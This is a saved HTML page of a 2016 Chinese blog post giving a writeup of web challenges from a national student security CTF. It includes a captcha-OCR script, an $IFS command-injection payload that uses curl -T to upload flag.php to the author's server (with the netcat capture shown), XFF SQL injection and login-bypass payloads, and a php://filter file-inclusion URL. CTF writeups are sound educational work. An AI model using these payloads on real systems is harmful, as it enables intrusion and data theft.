@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+
+<html lang="zh-Hans">
+<head>
+<!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+<meta charset="utf-8"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<meta content="telephone=no" name="format-detection">
+<meta content="LoRexxar" name="author"/>
+<meta content="周末在北京wooyun峰会的旅途上打了一场大学生信息安全的国赛的技能赛，本以为能进的决赛，却因为人手不够再加上个人水平太差错过了，虽然i春秋的平台一股浓浓的国产页游风，但不得不说，题目的质量确实不算差，稍微整理下wp…" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="信息安全国赛技能赛 Writeup" property="og:title"/>
+<meta content="http://lorexxar.cn/2016/07/12/guosai-ctf-wp/index.html" property="og:url"/>
+<meta content="LoRexxar's Blog" property="og:site_name"/>
+<meta content="周末在北京wooyun峰会的旅途上打了一场大学生信息安全的国赛的技能赛，本以为能进的决赛，却因为人手不够再加上个人水平太差错过了，虽然i春秋的平台一股浓浓的国产页游风，但不得不说，题目的质量确实不算差，稍微整理下wp…" property="og:description"/>
+<meta content="2016-07-12T07:21:16.000Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="信息安全国赛技能赛 Writeup" name="twitter:title"/>
+<meta content="周末在北京wooyun峰会的旅途上打了一场大学生信息安全的国赛的技能赛，本以为能进的决赛，却因为人手不够再加上个人水平太差错过了，虽然i春秋的平台一股浓浓的国产页游风，但不得不说，题目的质量确实不算差，稍微整理下wp…" name="twitter:description"/>
+<link href="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/atom.xml" rel="alternate" title="LoRexxar's Blog" type="application/atom+xml"/>
+<link href="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/699-14040QPP9.jpg" rel="shortcut icon"/>
+<link href="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/jquery.fancybox.min.css" rel="stylesheet"/>
+<script src="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/pace.min.js"></script>
+<link href="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/pace-theme-minimal.css" rel="stylesheet"/>
+<link href="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/style.css" rel="stylesheet"/>
+<link href="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/font-awesome.min.css" rel="stylesheet"/>
+<title>信息安全国赛技能赛 Writeup | LoRexxar's Blog</title>
+<script src="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/jquery.min.js"></script>
+<script src="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/clipboard.min.js"></script>
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: false,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+<script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+<script> yiliaConfig.rootUrl = "\/";</script>
+<script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+</meta></meta></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<form id="search-form">
+<input autocomplete="off" autocorrect="off" class="search form-control" id="local-search-input" name="q" placeholder="search..." searchonload="false" type="text"/>
+<i class="fa fa-times" onclick="resetSearch()"></i>
+</form>
+<div id="local-search-result"></div>
+<p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" title="知乎"></a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CBC/">CBC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essay/">Essay</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essry/">Essry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC通道入侵/">IPC通道入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LD-PRELOAD/">LD_PRELOAD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reprint/">Reprint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shadow-Brokers/">Shadow Brokers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book-notes/">book_notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bookshelf/">bookshelf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cloudeye/">cloudeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmd/">cmd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crontab/">crontab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csp/">csp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns/">dns</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eassy/">eassy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastcgi/">fastcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fcgi/">fcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file-put-contents/">file_put_contents</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gopher/">gopher</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hctf/">hctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/injection/">injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lcx端口转发/">lcx端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lfi/">lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opcache/">opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pdflatex/">pdflatex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-opcache/">php opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpmailer/">phpmailer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php伪协议/">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnhub/">pwnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rabins/">rabins</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sangebaimao/">sangebaimao</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-sock5/">ssh_sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/titan-souls/">titan_souls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tqdm/">tqdm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenv/">virtualenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/">weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/win-server信息收集/">win server信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪协议/">伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/参数污染/">参数污染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式化字符串/">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板注入/">模板注入</a></li></ul>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="https://coding.net/u/LoRexxar">Coding</a>
+<a class="main-nav-link switch-friends-link" href="https://github.com/LoRexxar">GitHub</a>
+<a class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+<a class="main-nav-link switch-friends-link" href="https://wiki.hduisa.cn">HDUISA_wiki</a>
+<a class="main-nav-link switch-friends-link" href="https://lightless.me/">lightless</a>
+<a class="main-nav-link switch-friends-link" href="http://lazysheep.cc">Hcamael</a>
+<a class="main-nav-link switch-friends-link" href="http://aklis.info/">Aklis</a>
+<a class="main-nav-link switch-friends-link" href="http://libc.pw/">zh_explorer</a>
+<a class="main-nav-link switch-friends-link" href="http://edwardl.xyz/">Edward_L</a>
+<a class="main-nav-link switch-friends-link" href="http://evilddog.space/">evilddog</a>
+<a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
+<a class="main-nav-link switch-friends-link" href="http://www.nohackair.net/">Airbasic</a>
+<a class="main-nav-link switch-friends-link" href="https://loli.be/">Mashiro</a>
+<a class="main-nav-link switch-friends-link" href="http://www.codersec.net/">bsmali4</a>
+<a class="main-nav-link switch-friends-link" href="/www.bertramc.cn">berTrAM</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">带着对技术的敬畏之心成长，不安于一隅...</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LoRexxar</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="回到主页">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" target="_blank" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" target="_blank" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" target="_blank" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" target="_blank" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" target="_blank" title="知乎"></a>
+</ul>
+</nav>
+</header>
+</div>
+<link about="关于我" class="menu-list" friends="友情链接" tags="标签">
+</link></nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-guosai-ctf-wp" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2016/07/12/guosai-ctf-wp/">
+<time datetime="2016-07-12T05:42:28.000Z" itemprop="datePublished">2016-07-12</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      信息安全国赛技能赛 Writeup
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-category tagcloud">
+<a class="article-category-link" href="/categories/Blogs/">Blogs</a>
+</div>
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/access/">access</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqli/">sqli</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/伪协议/">伪协议</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<p>周末在北京wooyun峰会的旅途上打了一场大学生信息安全的国赛的技能赛，本以为能进的决赛，却因为人手不够再加上个人水平太差错过了，虽然i春秋的平台一股浓浓的国产页游风，但不得不说，题目的质量确实不算差，稍微整理下wp…</p>
+<a id="more"></a>
+<h1 id="WEB"><a class="headerlink" href="#WEB" title="WEB"></a>WEB</h1><h2 id="web150-脚本抢金币"><a class="headerlink" href="#web150-脚本抢金币" title="web150 脚本抢金币"></a>web150 脚本抢金币</h2><p>150这题没什么可说，由于验证码比较弱，所以上网找个识别验证码的再写个脚本就好了，贴上队友的脚本</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># coding: utf-8</span></div><div class="line"></div><div class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</div><div class="line">from PIL <span class="built_in">import</span> Image</div><div class="line"><span class="built_in">import</span> pytesseract</div><div class="line"><span class="built_in">import</span> requests</div><div class="line"></div><div class="line"><span class="attr">url</span> = <span class="string">"http://106.75.30.59:8888/game.php"</span></div><div class="line"><span class="attr">cookies</span> = dict(<span class="attr">PHPSESSID="2cr00id1lh76jgskh4ddlr15m1")</span></div><div class="line"></div><div class="line"><span class="attr">r</span> = requests.get(url, <span class="attr">cookies=cookies)</span></div><div class="line"><span class="attr">raw_content</span> = r.content</div><div class="line"><span class="comment"># print raw_content</span></div><div class="line"></div><div class="line"><span class="attr">soup</span> = BeautifulSoup(raw_content, <span class="string">"html5lib"</span>)</div><div class="line"><span class="attr">raw_tr</span> = soup.find_all('tr')</div><div class="line"><span class="comment"># raw_a_tag = raw_a_tag[1:21]</span></div><div class="line"><span class="attr">raw_tr</span> = raw_tr[<span class="number">1</span>:<span class="number">21</span>]</div><div class="line"></div><div class="line">for i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">200</span>):</div><div class="line">    for tr <span class="keyword">in</span> raw_tr:</div><div class="line">        <span class="attr">name</span> = tr.find_all('td')[<span class="number">1</span>].get_text()</div><div class="line">        <span class="attr">robid</span> = tr.find_all('a')[<span class="number">0</span>].get('href')</div><div class="line"></div><div class="line">        <span class="comment"># bypass limit</span></div><div class="line">        <span class="attr">url</span> = <span class="string">"http://106.75.30.59:8888/"</span> + robid[<span class="number">2</span>:]</div><div class="line">        requests.get(url, <span class="attr">cookies=cookies)</span></div><div class="line"></div><div class="line">        <span class="comment"># get code</span></div><div class="line">        <span class="attr">url</span> = <span class="string">"http://106.75.30.59:8888/code.php"</span></div><div class="line">        <span class="attr">code</span> = requests.get(url, <span class="attr">cookies=cookies)</span></div><div class="line">        <span class="keyword">with</span> open(<span class="string">"code.png"</span>, <span class="string">"wb"</span>) as ff:</div><div class="line">            ff.write(code.content)</div><div class="line">        <span class="attr">img</span> = Image.open(<span class="string">"code.png"</span>)</div><div class="line">        <span class="attr">code_string</span> = pytesseract.image_to_string(img)</div><div class="line"></div><div class="line">        <span class="comment"># do rob</span></div><div class="line">        <span class="attr">data</span> = {</div><div class="line">            'user': name,</div><div class="line">            'num' : '<span class="number">1000</span>',</div><div class="line">            'code': code_string</div><div class="line">        }</div><div class="line">        <span class="attr">r</span> = requests.post('http://<span class="number">106.75</span>.<span class="number">30.59</span>:<span class="number">8888</span>/dorob.php', <span class="attr">data=data,</span> <span class="attr">cookies=cookies)</span></div><div class="line">        <span class="attr">ss</span> = BeautifulSoup(r.content, <span class="string">"html5lib"</span>)</div><div class="line">        print ss.find_all('h1')[<span class="number">0</span>].get_text()</div></pre></td></tr></table></figure>
+<h2 id="web200-IFS绕过导致的任意curl"><a class="headerlink" href="#web200-IFS绕过导致的任意curl" title="web200 IFS绕过导致的任意curl"></a>web200 IFS绕过导致的任意curl</h2><p>fuzz了很久找到了.index.php.swo</p>
+<p>改为.swp后缀，新建index.php，vim打开恢复，get源码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">strreplace</span><span class="params">($str)</span></span>{ </div><div class="line">	error_reporting(E_ALL || ~E_NOTICE);</div><div class="line">	$str = str_replace(<span class="string">'+'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'@'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'?'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'!'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'#'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'%'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'}'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'{'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">')'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'('</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">')'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'&gt;'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'&amp;'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'|'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$str);</div><div class="line">    $str = str_replace(<span class="string">'`'</span>,<span class="string">''</span>,$str);</div><div class="line">	<span class="keyword">return</span> $str;</div><div class="line">}      </div><div class="line"></div><div class="line"><span class="keyword">if</span>($_GET[num]&lt;&gt;<span class="string">""</span>)</div><div class="line">{ </div><div class="line">	$num = $_GET[num];</div><div class="line">	<span class="keyword">if</span>(strstr($num,<span class="string">'1'</span>))</div><div class="line">		<span class="keyword">die</span>(<span class="string">"Sorry"</span>);</div><div class="line">}</div><div class="line"><span class="keyword">elseif</span>($num &lt;&gt; <span class="number">1</span>){</div><div class="line">{</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Try to num = 1"</span>;</div><div class="line">}</div><div class="line"><span class="keyword">if</span>($num == <span class="number">1</span> ){</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Flag in http://127.0.0.1/flag.php"</span>.<span class="string">"&lt;/br&gt;"</span>;</div><div class="line">	$cmd=trim($_GET[<span class="string">'cmd'</span>]); </div><div class="line">	$cmd=strreplace($cmd);</div><div class="line">	system(<span class="string">"curl$cmd/flag.php"</span>);</div><div class="line">	}</div><div class="line">}<span class="keyword">else</span>{<span class="keyword">echo</span> <span class="string">"It Works!"</span>;}</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>第一步没什么可说的其实，php特性，0.99999999999999就会产生小数下标溢出为1。</p>
+<p>然后是第二部步，在shell中<code>$IFS</code>会被解释为空格，这样就可以巧妙绕过trim的过滤，这样我们就可以使用任意curl命令了，但是尝试了很多办法都和直接访问flag.php是相同的，但是curl可以使用-T来把本地文件上传到ftp服务器，那么我们可以构造向我们的服务器上传文件，这样就可以get flag.php这个文件</p>
+<p>payload:<br/><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">ttp:</span><span class="comment">//106.75.32.87:16888/index.php?num=0.99999999999999999999999999999999999&amp;cmd=$IFS-T flag.php -a http://x<span class="doctag">xxx:</span>xx</span></div></pre></td></tr></table></figure></p>
+<p>这里的xxxx就是你自己服务器地址，然后再服务器监听xx端口，就可以看到了<br/><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">root<span class="variable">@iZ285ei82c1Z:</span>/home/wwwroot/default/test# nc -lvv <span class="number">20</span></div><div class="line">Listening on [<span class="number">0.0</span>.<span class="number">0.0</span>] (family <span class="number">0</span>, port <span class="number">20</span>)</div><div class="line">Connection from [<span class="number">106.75</span>.<span class="number">32.87</span>] port <span class="number">20</span> [tcp/ftp-data] accepted (family <span class="number">2</span>, sport <span class="number">44712</span>)</div><div class="line">PUT /flag.php HTTP/<span class="number">1.1</span></div><div class="line"><span class="attribute">User-Agent</span>: curl/<span class="number">7.35</span>.<span class="number">0</span></div><div class="line"><span class="attribute">Host</span>: <span class="number">115.28</span>.<span class="number">78.16</span>:<span class="number">20</span></div><div class="line"><span class="attribute">Accept</span>: *<span class="comment">/*</span></div><div class="line">Content-Length: 116</div><div class="line">Expect: 100-continue</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">echo "Yep,Flag is here,But u cant look in here!";</div><div class="line">//flag is here!</div><div class="line">//flag{2984bce1807c46879cb80995c7003109}</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="web300-SQL"><a class="headerlink" href="#web300-SQL" title="web300 SQL"></a>web300 SQL</h2><p>打开发现登陆和改名的地方都有注入，但是waf比较迷，数据库也不知道，所以第一天完全没有任何思路，给的提示也是迷迷糊糊的，第一天晚上扫目录的时候获得了一个比较重要的信息，在web根目录下存在2.txt log日志(怎么会有这种名字的日志。。。)…</p>
+<p>得到了sql语句<br/><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">update</span> userinfo <span class="keyword">set</span> <span class="keyword">user</span>=<span class="string">'ssss'</span>,lasetloginip=<span class="string">'111.111.111.111'</span> <span class="keyword">where</span> utoken=<span class="string">'xxxxxxxxx'</span></div></pre></td></tr></table></figure></p>
+<p>那么就是xff注入了，构造post请求为<br/><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user=,info='<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></div></pre></td></tr></table></figure></p>
+<p>修改xff为<br/><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">114.246</span><span class="number">.76</span><span class="number">.88</span>',user=DLOOKUP('flag', 'ctf'),<span class="section">email</span>=</div></pre></td></tr></table></figure></p>
+<p>这里的dlookup真的是找了好久才知道，由于不熟悉access数据库，access数据库中不能直接代入子查询，需要inner join，但是inner join必须在set前…踩了不熟悉的坑..哎…</p>
+<h2 id="web400-phpup"><a class="headerlink" href="#web400-phpup" title="web400 phpup"></a>web400 phpup</h2><p>打开首先看看文章，文章里提到有admin的登陆界面，偶然发现有个admin的js，按home键就会出现登陆界面，顺藤摸瓜找到一个登陆接口，这个接口开着报错而且没有任何过滤，除了不能回显以外什么都可以，那么sqlmap都可以跑…</p>
+<p>有个问题是from被过滤了，那么只能注当前表，可惜密码解不开，但是我们可以巧妙绕过</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username=<span class="string">' union select '</span><span class="number">0</span>cc175b9c0f1b6a831c399e269772661'<span class="comment">%23</span></div><div class="line">&amp;password=a</div></pre></td></tr></table></figure>
+<p>发现了admininfile.php文件，有文件包含漏洞<br/><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">106.75</span>.<span class="number">30.59</span>:<span class="number">2333</span><span class="regexp">/admin/</span>admininfile.php?name=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=upload</div></pre></td></tr></table></figure></p>
